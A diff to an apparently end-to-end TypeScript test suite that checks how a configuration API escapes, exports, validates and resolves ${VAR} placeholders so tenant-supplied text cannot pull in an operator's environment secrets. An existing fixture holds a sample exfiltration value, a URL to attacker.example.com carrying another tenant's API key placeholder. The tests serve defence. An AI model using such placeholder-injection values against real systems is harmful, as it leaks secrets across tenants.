@@ -1,3 +1,4 @@
+import { generateKeyPairSync } from "node:crypto";
 import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -26,9 +27,13 @@ describe("placeholder text in configuration stored through the API", () => {
         description: "${OTHER_TENANT_API_KEY}",
         url: "https://attacker.example.com/?k=${OTHER_TENANT_API_KEY:x}",
     };
+    /** A variable no environment of this suite sets. */
+    const UNSET = "EUDIPLO_E2E_PLACEHOLDER_UNSET";
     const before = {
         CONFIG_FOLDER: process.env.CONFIG_FOLDER,
         CONFIG_IMPORT_MODE: process.env.CONFIG_IMPORT_MODE,
+        CONFIG_VARIABLE_STRICT: process.env.CONFIG_VARIABLE_STRICT,
+        [UNSET]: process.env[UNSET],
         FOLDER: process.env.FOLDER,
         OTHER_TENANT_API_KEY: process.env.OTHER_TENANT_API_KEY,
     };
@@ -78,6 +83,10 @@ describe("placeholder text in configuration stored through the API", () => {
         process.env.FOLDER = runtimeFolder;
         // A variable of the operator's own, meant for another tenant's files.
         process.env.OTHER_TENANT_API_KEY = SECRET;
+        // A folder file may leave a placeholder unresolved, which the plan
+        // then reports. The mode is read when the module is compiled.
+        process.env.CONFIG_VARIABLE_STRICT = "ignore";
+        delete process.env[UNSET];
 
         const { AppModule } = await import("../../src/app.module.js");
         const moduleFixture = await Test.createTestingModule({
@@ -380,6 +389,14 @@ describe("placeholder text in configuration stored through the API", () => {
         );
         expect(client.spec.description).toBe("$${OTHER_TENANT_API_KEY}");
         expect(client.spec.secret).toMatch(/^\$\{CLIENT_[A-Z0-9_]+\}$/);
+
+        // The export of the one resource writes the same document.
+        const single = await request(http())
+            .get("/config-bundles/resources/Client/texty/document")
+            .set("Authorization", authorization)
+            .expect(200);
+        expect(single.body.spec.description).toBe("$${OTHER_TENANT_API_KEY}");
+        expect(single.body.spec.secret).toBe(client.spec.secret);
     });
 
     it.each([
@@ -424,6 +441,188 @@ describe("placeholder text in configuration stored through the API", () => {
         },
     );
 
+    it("plans a folder file with an unresolved placeholder under CONFIG_VARIABLE_STRICT=ignore", async () => {
+        await request(http())
+            .post("/issuer/webhook-endpoints")
+            .set("Authorization", authorization)
+            .send(webhook({ id: "unset-name" }))
+            .expect(201);
+        const named = await exportedDocument("unset-name");
+        named.spec.name = `\${${UNSET}}`;
+        writeFolderFile("unset-name", named);
+
+        const namePlan = await request(http())
+            .post(
+                "/config-bundles/resources/WebhookEndpoint/unset-name/reattach/plan",
+            )
+            .set("Authorization", authorization)
+            .expect(201);
+        expect(namePlan.body.applicable).toBe(false);
+        expect(namePlan.body.items[0].issues).toEqual([
+            expect.objectContaining({
+                code: "SECRET_REQUIRED",
+                path: "/spec/name",
+            }),
+        ]);
+
+        // Inside a longer value, the placeholder of a folder file is stored
+        // as text: the loader has reported it, so the plan does not.
+        await request(http())
+            .post("/issuer/webhook-endpoints")
+            .set("Authorization", authorization)
+            .send(webhook({ id: "unset-url" }))
+            .expect(201);
+        const linked = await exportedDocument("unset-url");
+        const url = `https://hooks.example.com/?k=\${${UNSET}}`;
+        linked.spec.url = url;
+        writeFolderFile("unset-url", linked);
+
+        const urlPlan = await request(http())
+            .post(
+                "/config-bundles/resources/WebhookEndpoint/unset-url/reattach/plan",
+            )
+            .set("Authorization", authorization)
+            .expect(201);
+        expect(urlPlan.body.applicable).toBe(true);
+        expect(urlPlan.body.items[0].issues).toEqual([]);
+        await request(http())
+            .post(
+                "/config-bundles/resources/WebhookEndpoint/unset-url/reattach",
+            )
+            .query({ planFingerprint: urlPlan.body.planFingerprint })
+            .set("Authorization", authorization)
+            .expect(201);
+        expect((await stored("unset-url")).url).toBe(url);
+    });
+
+    it("validates the values of a file, not their escaped form, so a value at maxLength holding ${ re-imports from its export", async () => {
+        const { publicKey } = generateKeyPairSync("ec", {
+            namedCurve: "P-256",
+        });
+        // 1000 characters, the maxLength of a trust anchor's description;
+        // the export writes 1001.
+        const description = `\${${"a".repeat(998)}`;
+        await request(http())
+            .post("/federation-trust-anchor")
+            .set("Authorization", authorization)
+            .send({
+                id: "long",
+                entityId: "https://anchor.example.com",
+                description,
+                jwks: {
+                    keys: [
+                        { ...publicKey.export({ format: "jwk" }), kid: "k1" },
+                    ],
+                },
+            })
+            .expect(201);
+        const exported = await request(http())
+            .get("/config-bundles/export")
+            .set("Authorization", authorization)
+            .expect(200);
+        const document = exported.body.documents.find(
+            (item: any) =>
+                String(item.$schema).includes("FederationTrustAnchor") &&
+                item.spec?.id === "long",
+        );
+        expect(document.spec.description).toBe(`$${description}`);
+
+        const plan = await request(http())
+            .post("/config-bundles/plan")
+            .set("Authorization", authorization)
+            .send(
+                documentsBundle(tenantId, [
+                    {
+                        kind: "FederationTrustAnchor",
+                        id: "long",
+                        path: "federation-trust-anchors/long.json",
+                        spec: document.spec,
+                        generation: document.metadata.generation,
+                    },
+                ]),
+            )
+            .expect(201);
+        expect(plan.body.items[0].issues).toEqual([]);
+        expect(plan.body.items[0].changes ?? []).toEqual([]);
+
+        // The upgrade of one document checks it the same way and gives back
+        // the file.
+        const upgraded = await request(http())
+            .post("/config-bundles/documents/upgrade")
+            .set("Authorization", authorization)
+            .send(document)
+            .expect(201);
+        expect(upgraded.body.issues).toEqual([]);
+        expect(upgraded.body.document.spec.description).toBe(`$${description}`);
+
+        // One character more than the schema allows is still refused.
+        const tooLong = await request(http())
+            .post("/config-bundles/plan")
+            .set("Authorization", authorization)
+            .send(
+                documentsBundle(tenantId, [
+                    {
+                        kind: "FederationTrustAnchor",
+                        id: "long",
+                        path: "federation-trust-anchors/long.json",
+                        spec: {
+                            ...document.spec,
+                            description: `$${description}a`,
+                        },
+                        generation: document.metadata.generation,
+                    },
+                ]),
+            )
+            .expect(201);
+        expect(tooLong.body.applicable).toBe(false);
+        expect(tooLong.body.items[0].issues).toEqual(
+            expect.arrayContaining([
+                expect.objectContaining({
+                    code: "CONFIG_SCHEMA_VALIDATION_FAILED",
+                    path: "/spec/description",
+                }),
+            ]),
+        );
+
+        // The apply checks the same values: a changed value at maxLength is
+        // written as the text the file holds.
+        const changed = `\${${"b".repeat(998)}`;
+        const updateBundle = documentsBundle(tenantId, [
+            {
+                kind: "FederationTrustAnchor",
+                id: "long",
+                path: "federation-trust-anchors/long.json",
+                spec: { ...document.spec, description: `$${changed}` },
+                generation: document.metadata.generation,
+            },
+        ]);
+        const update = await request(http())
+            .post("/config-bundles/plan")
+            .query({ mode: "upsert" })
+            .set("Authorization", authorization)
+            .send(updateBundle)
+            .expect(201);
+        expect(update.body.applicable).toBe(true);
+        expect(update.body.items[0].action).toBe("update");
+        await request(http())
+            .post("/config-bundles/import")
+            .query({
+                mode: "upsert",
+                planFingerprint: update.body.planFingerprint,
+            })
+            .set("Authorization", authorization)
+            .send(updateBundle)
+            .expect(201);
+        const anchors = await request(http())
+            .get("/federation-trust-anchor")
+            .set("Authorization", authorization)
+            .expect(200);
+        expect(
+            anchors.body.find((anchor: { id: string }) => anchor.id === "long")
+                .description,
+        ).toBe(changed);
+    });
+
     it("still resolves a placeholder the operator writes to the tenant's folder", async () => {
         await request(http())
             .post("/issuer/webhook-endpoints")
@@ -441,11 +640,20 @@ describe("placeholder text in configuration stored through the API", () => {
             .set("Authorization", authorization)
             .expect(201);
         expect(plan.body.applicable).toBe(true);
+        // The operator put the value into a field that is no secret: once
+        // applied, the resource shows it to the tenant anyway, so the plan
+        // shows it too. Secret fields are redacted by their path.
         expect(plan.body.items[0].changes).toEqual([
             expect.objectContaining({
                 path: "/spec/name",
                 after: `Operator ${SECRET}`,
             }),
         ]);
+        await request(http())
+            .post("/config-bundles/resources/WebhookEndpoint/operator/reattach")
+            .query({ planFingerprint: plan.body.planFingerprint })
+            .set("Authorization", authorization)
+            .expect(201);
+        expect((await stored("operator")).name).toBe(`Operator ${SECRET}`);
     });
 });
